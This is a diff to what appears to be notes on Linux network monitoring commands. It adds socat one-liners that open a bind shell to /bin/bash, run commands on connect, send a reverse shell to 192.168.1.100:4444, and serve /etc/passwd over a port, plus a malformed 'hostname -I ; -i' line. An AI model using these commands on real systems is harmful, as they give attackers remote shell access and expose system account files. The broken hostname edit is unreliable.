@@ -24,7 +24,7 @@ Monitoring
 
     ip addr
     ip a
-    hostname -I
+    hostname -I ; -i
     
 
 ## tcpdump
@@ -39,4 +39,12 @@ Monitoring
 
     REVERSE_IP=$(hostname -I | tr -d " ")
 
-    
+    socat TCP-LISTEN:4444 EXEC:/bin/bash
+    socat TCP-LISTEN:5555 SYSTEM:"id"
+    socat TCP-CONNECT:192.168.1.100:4444 EXEC:/bin/sh
+    socat TCP-LISTEN:6666 EXEC:"cat /etc/passwd"
+
+
+    ss
+
+
